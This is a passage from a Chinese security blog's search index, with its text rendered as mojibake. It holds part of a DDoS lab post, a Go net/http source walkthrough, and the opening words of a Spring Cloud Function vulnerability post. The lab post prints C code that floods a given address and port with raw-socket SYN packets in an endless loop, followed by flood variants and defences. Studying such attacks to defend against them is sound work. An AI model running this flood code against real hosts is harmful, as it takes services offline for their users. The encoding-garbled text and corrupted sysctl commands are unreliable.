SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%då·²æ”»å‡»!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 å®éªŒç»“è®º udp_floodæ”»å‡»å°±æ˜¯æ„é€ å¤§é‡çš„udpåŒ…(å¯ä»¥æºå¸¦å°‘é‡æ•°æ®ï¼Œä¹Ÿå¯ä»¥æºå¸¦å¤§é‡æ•°æ®ï¼Œæºå¸¦æ•°æ®é‡è¶Šå¤§å¯¹æœåŠ¡å™¨çš„è½½è·æ‰¿å—å°±è¶Šä¸¥é‡)ï¼Œå ç”¨æœåŠ¡å™¨å¤§é‡çš„å¤„ç†å†…å­˜ï¼Œä»è€Œå¼•èµ·æœåŠ¡å™¨å´©æºƒã€‚\nSYN-Floodä¸‰ç§æ”»å‡»æ–¹å¼\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» é˜²å¾¡æ‰‹æ®µ\nUdp_Flood\nå¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ¨åˆ†é™åˆ¶äº†ICMPæŠ¥æ–‡çš„å“åº”é€Ÿç‡ï¼Œä»¥ä¸­æ–­éœ€è¦ICMPå“åº”çš„DDoSæ”»å‡»ã€‚è¿™ç§ç¼“è§£çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯åœ¨æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œåˆæ³•çš„æ•°æ®åŒ…ä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ã€‚å¦‚æœUDP Floodçš„å®¹é‡è¶³å¤Ÿé«˜ä»¥ä½¿ç›®æ ‡æœåŠ¡å™¨çš„é˜²ç«å¢™çš„çŠ¶æ€è¡¨é¥±å’Œï¼Œåˆ™åœ¨æœåŠ¡å™¨çº§åˆ«å‘ç”Ÿçš„ä»»ä½•ç¼“è§£éƒ½å°†ä¸è¶³ä»¥åº”å¯¹ç›®æ ‡è®¾å¤‡ä¸Šæ¸¸çš„ç“¶é¢ˆã€‚ åˆ¤æ–­åŒ…å¤§å°ï¼Œå¦‚æœæ˜¯å¤§åŒ…æ”»å‡»åˆ™ä½¿ç”¨é˜²æ­¢UDPç¢ç‰‡æ–¹æ³•ï¼šæ ¹æ®æ”»å‡»åŒ…å¤§å°è®¾å®šåŒ…ç¢ç‰‡é‡ç»„å¤§å°ï¼Œé€šå¸¸ä¸å°äº1500ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘ä¸¢å¼ƒæ‰€æœ‰UDPç¢ç‰‡ã€‚ SYN-Flood\nç¼©çŸ­è¶…æ—¶ï¼ˆSYN Timeoutï¼‰æ—¶é—´\nç”±äºSYN Floodæ”»å‡»çš„æ•ˆæœå–å†³äºæœåŠ¡å™¨ä¸Šä¿æŒçš„SYNåŠè¿æ¥æ•°ï¼Œè¿™ä¸ªå€¼=SYNæ”»å‡»çš„é¢‘åº¦ x SYN Timeoutï¼Œæ‰€ä»¥é€šè¿‡ç¼©çŸ­ä»æ¥æ”¶åˆ°SYNæŠ¥æ–‡åˆ°ç¡®å®šè¿™ä¸ªæŠ¥æ–‡æ— æ•ˆå¹¶ä¸¢å¼ƒæ”¹è¿æ¥çš„æ—¶é—´ï¼Œä¾‹å¦‚è®¾ç½®ä¸º20ç§’ä»¥ä¸‹ï¼Œå¯ä»¥æˆå€çš„é™ä½æœåŠ¡å™¨çš„è´Ÿè·ã€‚ä½†è¿‡ä½çš„SYN Timeoutè®¾ç½®å¯èƒ½ä¼šå½±å“å®¢æˆ·çš„æ­£å¸¸è®¿é—®ã€‚\næ³¨æ„ï¼šç¼©çŸ­SYN Timeoutæ—¶é—´ä»…åœ¨å¯¹æ–¹æ”»å‡»é¢‘åº¦ä¸é«˜çš„æƒ…å†µä¸‹ç”Ÿæ•ˆ\nå¢åŠ æœ€å¤§åŠè¿æ¥æ•°\nMore Actionsåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -agrep net.ipv4.tcp_max_syn_backlogâ€å¯ä»¥æŸ¥çœ‹æœ€å¤§åŠè¿æ¥æ•°ï¼Œä¸€èˆ¬æ¥è¯´å¤§å°ä¸º128ï¼Œè¿™ä¸ªé»˜è®¤å€¼å¯¹äºWebæœåŠ¡å™¨æ¥è¯´æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œä¸€æ¬¡ç®€å•çš„SYNæ”»å‡»å°±è¶³ä»¥å°†å…¶å®Œå…¨å ç”¨ã€‚ å› æ­¤ï¼Œé˜²å¾¡DOSæ”»å‡»æœ€ç®€å•çš„åŠæ³•å°±æ˜¯å¢å¤§è¿™ä¸ªé»˜è®¤å€¼ï¼Œåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -w et.ipv4.tcp_max_syn_backlog=3000â€ï¼Œè¿™æ ·å°±å¯ä»¥å°†é˜Ÿåˆ—SYNæœ€å¤§åŠè¿æ¥æ•°å®¹é‡å€¼æ”¹ä¸º3000äº† è¿‡æ»¤ç½‘å…³é˜²æŠ¤\nä¸€ç§æ–¹å¼æ˜¯é˜²æ­¢å¢™ç¡®è®¤è¿æ¥çš„æœ‰æ•ˆæ€§åï¼Œé˜²ç«å¢™æ‰ä¼šå‘å†…éƒ¨æœåŠ¡å™¨å‘èµ·SYNè¯·æ±‚ã€‚é˜²ç«å¢™ä»£æœåŠ¡å™¨å‘å‡ºçš„SYN ACKåŒ…ä½¿ç”¨çš„åºåˆ—å·ä¸ºc, è€ŒçœŸæ­£çš„æœåŠ¡å™¨å›åº”çš„åºåˆ—å·ä¸ºcâ€™, è¿™æ ·ï¼Œåœ¨æ¯ä¸ªæ•°æ®æŠ¥æ–‡ç»è¿‡é˜²ç«å¢™çš„æ—¶å€™è¿›è¡Œåºåˆ—å·çš„ä¿®æ”¹ã€‚\nå¦ä¸€ç§æ–¹å¼æ˜¯é˜²ç«å¢™ç¡®å®šäº†è¿æ¥çš„å®‰å…¨åï¼Œä¼šå‘å‡ºä¸€ä¸ªsafe resetå‘½ä»¤ï¼Œclientä¼šè¿›è¡Œé‡æ–°è¿æ¥ï¼Œè¿™æ—¶å‡ºç°çš„synæŠ¥æ–‡ä¼šç›´æ¥æ”¾è¡Œã€‚è¿™æ ·ä¸éœ€è¦ä¿®æ”¹åºåˆ—å·äº†ã€‚ä½†æ˜¯ï¼Œclientéœ€è¦å‘èµ·ä¸¤æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œå› æ­¤å»ºç«‹è¿æ¥çš„æ—¶é—´å°†ä¼šå»¶é•¿ã€‚\nSYN cookiesæŠ€æœ¯\nç»™æ¯ä¸€ä¸ªè¯·æ±‚è¿æ¥çš„IPåœ°å€åˆ†é…ä¸€ä¸ªCookieï¼Œå¦‚æœçŸ­æ—¶é—´å†…è¿ç»­å—åˆ°æŸä¸ªIPçš„é‡å¤SYNæŠ¥æ–‡ï¼Œå°±è®¤å®šæ˜¯å—åˆ°äº†æ”»å‡»ï¼Œå¹¶è®°å½•åœ°å€ä¿¡æ¯ï¼Œä»¥åä»è¿™ä¸ªIPåœ°å€æ¥çš„åŒ…ä¼šè¢«ä¸€æ¦‚ä¸¢å¼ƒã€‚è¿™æ ·åšçš„ç»“æœä¹Ÿå¯èƒ½ä¼šå½±å“åˆ°æ­£å¸¸ç”¨æˆ·çš„è®¿é—®ã€‚ ","permalink":"http://www.reus09.top/posts/tech/ddos/","summary":"æ‹’ç»æœåŠ¡æ”»å‡» 0x01 å®éªŒç›®çš„ ä½¿ç”¨udp floodã€é˜¿æ‹‰ä¸ç­‰å·¥å…·ï¼Œåˆ†ç»„å±•å¼€æ”»å‡»å¹¶åˆ©ç”¨wiresharkåˆ†æã€‚ ç¼–ç¨‹å®ç°SYN Floodæ”»å‡»ã€‚ 0x02 å®éªŒå‰æ","title":"DDos"},{"content":"å¾ˆé•¿æ—¶é—´æ²¡æœ‰æ°´åšå®¢äº†ï¼Œå‰äº›å¤©å­¦ä¹ äº†ä¸€ä¸‹goçš„è¯­æ³•ã€‚goå‡­å€Ÿå…¶è½»é‡çº§å’Œå¹¶å‘æ€§çš„åŸå› ï¼Œæ€§èƒ½è¶Šæ¥è¶Šä¼˜å¼‚ï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹å¦‚ä½•é€šè¿‡goåŸç”Ÿçš„httpå¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå¹¶å¯¹å…¶è¿‡ç¨‹è¿›è¡Œä¸€å®šçš„å‰–æã€‚\n[TOC]\ngoåŸç”Ÿçš„webæœåŠ¡æ­å»º Go è¯­è¨€é‡Œé¢æä¾›äº†ä¸€ä¸ªå®Œå–„çš„ net/http åŒ…ï¼Œé€šè¿‡ http åŒ…å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°±æ­å»ºèµ·æ¥ä¸€ä¸ªå¯ä»¥è¿è¡Œçš„ Web æœåŠ¡ã€‚åŒæ—¶ä½¿ç”¨è¿™ä¸ªåŒ…èƒ½å¾ˆç®€å•åœ°å¯¹ Web çš„è·¯ç”±ï¼Œé™æ€æ–‡ä»¶ï¼Œæ¨¡ç‰ˆï¼Œcookie ç­‰æ•°æ®è¿›è¡Œè®¾ç½®å’Œæ“ä½œã€‚\næ¯”å¦‚è¯´ï¼Œç»™å®šä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;log\u0026#34; ) func sayhelloName(w http.ResponseWriter, r *http.Request) { r.ParseForm() // è§£æå‚æ•°ï¼Œé»˜è®¤æ˜¯ä¸ä¼šè§£æçš„ fmt.Println(r.Form) // è¿™äº›ä¿¡æ¯æ˜¯è¾“å‡ºåˆ°æœåŠ¡å™¨ç«¯çš„æ‰“å°ä¿¡æ¯ fmt.Println(\u0026#34;path\u0026#34;, r.URL.Path) fmt.Println(\u0026#34;scheme\u0026#34;, r.URL.Scheme) fmt.Println(r.Form[\u0026#34;url_long\u0026#34;]) for k, v := range r.Form { fmt.Println(\u0026#34;key:\u0026#34;, k) fmt.Println(\u0026#34;val:\u0026#34;, strings.Join(v, \u0026#34;\u0026#34;)) } fmt.Fprintf(w, \u0026#34;Hello astaxie!\u0026#34;) // è¿™ä¸ªå†™å…¥åˆ° w çš„æ˜¯è¾“å‡ºåˆ°å®¢æˆ·ç«¯çš„ } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayhelloName) // è®¾ç½®è®¿é—®çš„è·¯ç”± err := http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) // è®¾ç½®ç›‘å¬çš„ç«¯å£ if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } é€šè¿‡æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡httpåŒ…ä¸‹é¢çš„ä¸¤ä¸ªå‡½æ•°HandleFuncå’ŒListenAndServerå‡½æ•°å¯ä»¥å¼€å¯ä¸€ä¸ªwebæœåŠ¡å™¨ã€‚å¹¶ä¸”åœ¨HandleFuncä¸­æˆ‘ä»¬å¯ä»¥æŒ‡å®šæˆ‘ä»¬è¯¥è·¯ç”±ä¸‹é¢çš„å¤„ç†æ–¹æ³•ã€‚ httpåŒ…æ‰§è¡Œæµç¨‹ å¦‚å›¾ï¼Œä¸ºGoå®ç°WebæœåŠ¡çš„æµç¨‹å›¾ã€‚\n1ã€åœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªListen Socket ï¼Œç›‘å¬æŒ‡å®šçš„ç«¯å£ï¼Œç­‰åˆ°å®¢æˆ·ç«¯è®¿é—® 2ã€Listen Socketæ¥æ”¶åˆ°å®¢æˆ·ç«¯accept,å°±ä¼šç”Ÿæˆä¸€ä¸ªClient Socket,ä¹‹åæ‰€æœ‰çš„ä¼šè¯éƒ½ç”±Client Socket äº å®¢æˆ·ç«¯é€šä¿¡ã€‚ 3ã€å»ºç«‹è¿æ¥åï¼Œå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚æ—¶ã€‚é¦–å…ˆä» Client Socket è¯»å– HTTP è¯·æ±‚çš„åè®®å¤´ï¼Œå¦‚æœæ˜¯ POST æ–¹æ³•ï¼Œè¿˜å¯èƒ½è¦è¯»å–å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œç„¶åäº¤ç»™ç›¸åº”çš„ handler å¤„ç†è¯·æ±‚ï¼Œhandler å¤„ç†å®Œæ¯•å‡†å¤‡å¥½å®¢æˆ·ç«¯éœ€è¦çš„æ•°æ®ï¼Œé€šè¿‡ Client Socket å†™ç»™å®¢æˆ·ç«¯ã€‚(è¿™é‡Œçš„handlerå³ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°) å¦‚ä½•ç›‘å¬ç«¯å£ Go æ˜¯é€šè¿‡ä¸€ä¸ªå‡½æ•° ListenAndServe æ¥å¤„ç†è¿™äº›äº‹æƒ…çš„ï¼Œè¿™ä¸ªåº•å±‚å…¶å®è¿™æ ·å¤„ç†çš„ï¼šåˆå§‹åŒ–ä¸€ä¸ª server å¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº† net.Listen(\u0026ldquo;tcp\u0026rdquo;, addr)ï¼Œä¹Ÿå°±æ˜¯åº•å±‚ç”¨ TCP åè®®æ­å»ºäº†ä¸€ä¸ªæœåŠ¡ï¼Œç„¶åç›‘æ§æˆ‘ä»¬è®¾ç½®çš„ç«¯å£ã€‚\næˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ListenAndServeå¯ä»¥çœ‹åˆ°,ç¡®å®å¦‚æ­¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (srv *Server) ListenAndServe() error { if srv.shuttingDown() { return ErrServerClosed } addr := srv.Addr if addr == \u0026#34;\u0026#34; { addr = \u0026#34;:http\u0026#34; } ln, err := net.Listen(\u0026#34;tcp\u0026#34;, addr) if err != nil { return err } return srv.Serve(ln) } å¤„ç†è¯·æ±‚ ç„¶åï¼Œå»ºç«‹ç›‘æ§ä¹‹åï¼Œgoé€šè¿‡srv.Server(ln)æ–¹æ³•æ¥å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 func (srv *Server) Serve(l net.Listener) error { if fn := testHookServerServe; fn != nil { fn(srv, l) // call hook with unwrapped listener } origListener := l l = \u0026amp;onceCloseListener{Listener: l} defer l.Close() if err := srv.setupHTTP2_Serve(); err != nil { return err } if !srv.trackListener(\u0026amp;l, true) { return ErrServerClosed } defer srv.trackListener(\u0026amp;l, false) baseCtx := context.Background() if srv.BaseContext != nil { baseCtx = srv.BaseContext(origListener) if baseCtx == nil { panic(\u0026#34;BaseContext returned a nil context\u0026#34;) } } var tempDelay time.Duration // how long to sleep on accept failure ctx := context.WithValue(baseCtx, ServerContextKey, srv) for { rw, err := l.Accept() if err != nil { select { case \u0026lt;-srv.getDoneChan(): return ErrServerClosed default: } if ne, ok := err.(net.Error); ok \u0026amp;\u0026amp; ne.Temporary() { if tempDelay == 0 { tempDelay = 5 * time.Millisecond } else { tempDelay *= 2 } if max := 1 * time.Second; tempDelay \u0026gt; max { tempDelay = max } srv.logf(\u0026#34;http: Accept error: %v; retrying in %v\u0026#34;, err, tempDelay) time.Sleep(tempDelay) continue } return err } connCtx := ctx if cc := srv.ConnContext; cc != nil { connCtx = cc(connCtx, rw) if connCtx == nil { panic(\u0026#34;ConnContext returned nil\u0026#34;) } } tempDelay = 0 c := srv.newConn(rw) c.setState(c.rwc, StateNew, runHooks) // before Serve can return go c.serve(connCtx) } } è¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ã€‚é‡Œé¢æœ‰ä¸€ä¸ªforå¾ªç¯ï¼Œé€šè¿‡Listeneræ¥æ”¶æ•°æ®ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªConn,æœ€åé€šè¿‡go c.server()æ¥ä¿è¯é«˜å¹¶å‘ï¼Œä½¿ç”¨æˆ·çš„æ¯ä¸€æ¬¡è¯·æ±‚éƒ½åœ¨ä¸€ä¸ªæ–°çš„goroutineå»æœåŠ¡ï¼Œç›¸äº’ä¸å½±å“ã€‚\nåˆ†é…å‡½æ•°å¤„ç†è¯·æ±‚ åœ¨c.server()ä¸­ï¼Œå¯¹è¯·æ±‚åšä¸€ä¸‹å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„handler\n1 2 w, err := c.readRequest(ctx) serverHandler{c.server}.ServeHTTP(w, w.req) conn é¦–å…ˆä¼šè§£æ request:c.readRequest(), ç„¶åè·å–ç›¸åº”çš„ handler:handler := c.server.Handlerï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšæ‰åœ¨è°ƒç”¨å‡½æ•° ListenAndServe æ—¶å€™çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚\nè¿›ä¸€æ­¥æŸ¥çœ‹ServerHTTPå¦‚ä½•æ‰¾åˆ°å¯¹åº”çš„Handler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) { handler := sh.srv.Handler if handler == nil { handler = DefaultServeMux } if req.RequestURI == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; req.Method == \u0026#34;OPTIONS\u0026#34; { handler = globalOptionsHandler{} } if req.URL != nil \u0026amp;\u0026amp; strings.Contains(req.URL.RawQuery, \u0026#34;;\u0026#34;) { var allowQuerySemicolonsInUse int32 req = req.WithContext(context.WithValue(req.Context(), silenceSemWarnContextKey, func() { atomic.StoreInt32(\u0026amp;allowQuerySemicolonsInUse, 1) })) defer func() { if atomic.LoadInt32(\u0026amp;allowQuerySemicolonsInUse) == 0 { sh.srv.logf(\u0026#34;http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192\u0026#34;) } }() } handler.ServeHTTP(rw, req) } æˆ‘ä»¬å‰é¢ä¾‹å­ä¼ é€’çš„æ˜¯ nilï¼Œä¹Ÿå°±æ˜¯ä¸ºç©ºï¼Œé‚£ä¹ˆé»˜è®¤è·å– handler = DefaultServeMux, è¿™ä¸ªå˜é‡å°±æ˜¯ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå®ƒç”¨æ¥åŒ¹é… url è·³è½¬åˆ°å…¶ç›¸åº”çš„ handle å‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨http.HandleFunc(\u0026quot;/\u0026quot;, sayhelloName) æ¥ç”Ÿæˆä¸€ä¸ªhandlerã€‚è¿™ä¸ªä½œç”¨å°±æ˜¯æ³¨å†Œäº†è¯·æ±‚ / çš„è·¯ç”±è§„åˆ™ï¼Œå½“è¯·æ±‚ uri ä¸º \u0026ldquo;/\u0026quot;ï¼Œè·¯ç”±å°±ä¼šè½¬åˆ°å‡½æ•° sayhelloNameï¼ŒDefaultServeMux ä¼šè°ƒç”¨ ServeHTTP æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨å…¶å®å°±æ˜¯è°ƒç”¨ sayhelloName æœ¬èº«ï¼Œæœ€åé€šè¿‡å†™å…¥ response çš„ä¿¡æ¯åé¦ˆåˆ°å®¢æˆ·ç«¯ã€‚\nServeMuxçš„è‡ªå®šä¹‰ ä¸Šé¢è®²è¿°ä¼ å…¥çš„handlerä¸ºnilçš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨httpé»˜è®¤çš„è·¯ç”±å™¨ï¼Œé€šè¿‡è·¯ç”±å™¨å°†è¯·æ±‚ä¼ é€’åˆ°åç«¯å¤„ç†å‡½æ•°ã€‚\nç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 type ServeMux struct { mu sync.RWMutex // é”ï¼Œç”±äºè¯·æ±‚æ¶‰åŠåˆ°å¹¶å‘å¤„ç†ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä¸€ä¸ªé”æœºåˆ¶ m map[string]muxEntry // è·¯ç”±è§„åˆ™ï¼Œä¸€ä¸ª string å¯¹åº”ä¸€ä¸ª mux å®ä½“ï¼Œè¿™é‡Œçš„ string å°±æ˜¯æ³¨å†Œçš„è·¯ç”±è¡¨è¾¾å¼ hosts bool // æ˜¯å¦åœ¨ä»»æ„çš„è§„åˆ™ä¸­å¸¦æœ‰ host ä¿¡æ¯ } ä¸‹é¢çœ‹ä¸€ä¸‹å•ŠmuxEntry:\n1 2 3 4 5 type muxEntry struct { explicit bool // æ˜¯å¦ç²¾ç¡®åŒ¹é… h Handler // è¿™ä¸ªè·¯ç”±è¡¨è¾¾å¼å¯¹åº”å“ªä¸ª handler pattern string // åŒ¹é…å­—ç¬¦ä¸² } æ¥ç€çœ‹ä¸€ä¸‹ Handler :\n1 2 3 type Handler interface { ServeHTTP(ResponseWriter, *Request) // è·¯ç”±å®ç°å™¨ } ä¸‹å›¾æ˜¯é€šè¿‡debugè·å–çš„å°è£…åˆ°é»˜è®¤è·¯ç”±å™¨çš„ä¿¡æ¯ã€‚\nè¯¦ç»†ä»‹ç»ä¸€ä¸‹å¦‚ä½•å°†æˆ‘ä»¬ä¼ å…¥çš„å‡½æ•°å°è£…ä¸ºæˆ‘ä»¬è·¯ç”±å¯¹åº”çš„handlerã€‚\né¦–å…ˆï¼Œåœ¨httpåŒ…é‡Œé¢å®šä¹‰ä¸€ä¸ªç±»å‹HandleFuncï¼Œæˆ‘ä»¬å®šä¹‰çš„å‡½æ•°sayhelloNameå°±æ˜¯å…¶è°ƒç”¨ä¹‹åçš„ç»“æœï¼Œè¿™ä¸ªç±»å‹é»˜è®¤å°±å®ç°äº† ServeHTTP è¿™ä¸ªæ¥å£ï¼Œå³æˆ‘ä»¬è°ƒç”¨äº† HandlerFunc (f), å¼ºåˆ¶ç±»å‹è½¬æ¢ f æˆä¸º HandlerFunc ç±»å‹ï¼Œè¿™æ · f å°±æ‹¥æœ‰äº† ServeHTTP æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 type HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 1 2 3 4 5 6 7 8 // HandleFunc registers the handler function for the given pattern. func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } // å°†f()ç±»å‹å¼ºè½¬åŒ–ä¸º`HandleFunc` mux.Handle(pattern, HandlerFunc(handler)) } è¿™æ ·è·¯ç”±å™¨å°±å­˜å‚¨äº†å¯¹åº”çš„è·¯ç”±è§„åˆ™ï¼Œé»˜è®¤è·¯ç”±å™¨çš„ServeHTTPå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) { if r.RequestURI == \u0026#34;*\u0026#34; { w.Header().Set(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;) w.WriteHeader(StatusBadRequest) return } h, _ := mux.Handler(r) h.ServeHTTP(w, r) } å¦‚æœä¼ å…¥URIä¸º*,é‚£ä¹ˆå°±å…³é—­é“¾æ¥ï¼Œå¦åˆ™è°ƒç”¨mux.Handler(r)ï¼Œè¿”å›æˆ‘ä»¬è®¾ç½®è·¯ç”±çš„Handler,ç„¶åè°ƒç”¨ä»–çš„ServerHTTP(w,r) åˆ†æä¸€ä¸‹ï¼Œå¦‚ä½•é€šè¿‡mux.Handler(r)æ¥æ‰¾åˆ°æˆ‘ä»¬å¯¹åº”çš„è·¯ç”±\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) { // åˆ¤æ–­æ–¹æ³•æ˜¯å¦ä¸ºCONNECT if r.Method != \u0026#34;CONNECT\u0026#34; { if p := cleanPath(r.URL.Path); p != r.URL.Path { _, pattern = mux.handler(r.Host, p) return RedirectHandler(p, StatusMovedPermanently), pattern } } // ä¸æ˜¯CONNECTçš„è¯ï¼Œå°±è°ƒç”¨è‡ªå·±çš„hanlder return mux.handler(r.Host, r.URL.Path) } func (mux *ServeMux) handler(host, path string) (h Handler, pattern string) { mux.mu.RLock() defer mux.mu.RUnlock() // é€šè¿‡host + path åœ¨muä¸­åŒ¹é…è‡ªå·±çš„handler // Host-specific pattern takes precedence over generic ones if mux.hosts { h, pattern = mux.match(host + path) } if h == nil { h, pattern = mux.match(path) } if h == nil { h, pattern = NotFoundHandler(), \u0026#34;\u0026#34; } return } å‘ç°å…¶æ˜¯æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„ URL å’Œè·¯ç”±å™¨é‡Œé¢å­˜å‚¨çš„ map å»åŒ¹é…çš„ï¼Œå½“åŒ¹é…åˆ°ä¹‹åè¿”å›å­˜å‚¨çš„ handlerï¼Œè°ƒç”¨è¿™ä¸ª handler çš„ ServeHTTP æ¥å£å°±å¯ä»¥æ‰§è¡Œåˆ°ç›¸åº”çš„å‡½æ•°äº†ã€‚\nA åˆ¤æ–­æ˜¯å¦æœ‰è·¯ç”±èƒ½æ»¡è¶³è¿™ä¸ª requestï¼ˆå¾ªç¯éå† ServeMux çš„ muxEntryï¼‰ B å¦‚æœæœ‰è·¯ç”±æ»¡è¶³ï¼Œè°ƒç”¨è¿™ä¸ªè·¯ç”± handler çš„ ServeHTTP C å¦‚æœæ²¡æœ‰è·¯ç”±æ»¡è¶³ï¼Œè°ƒç”¨ NotFoundHandler çš„ ServeHTTP ","permalink":"http://www.reus09.top/posts/tech/go%E5%8E%9F%E7%94%9Fnet%E5%8C%85%E5%88%86%E6%9E%90/","summary":"å¾ˆé•¿æ—¶é—´æ²¡æœ‰æ°´åšå®¢äº†ï¼Œå‰äº›å¤©å­¦ä¹ äº†ä¸€ä¸‹goçš„è¯­æ³•ã€‚goå‡­å€Ÿå…¶è½»é‡çº§å’Œå¹¶å‘æ€§çš„åŸå› ï¼Œæ€§èƒ½è¶Šæ¥è¶Šä¼˜å¼‚ï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹å¦‚ä½•é€šè¿‡goåŸç”Ÿçš„http","title":"GoåŸç”ŸnetåŒ…åˆ†æ"},{"content":"æ¼æ´ä»‹ç» Spring Cloud Function æ˜¯åŸºäº Spring Boot 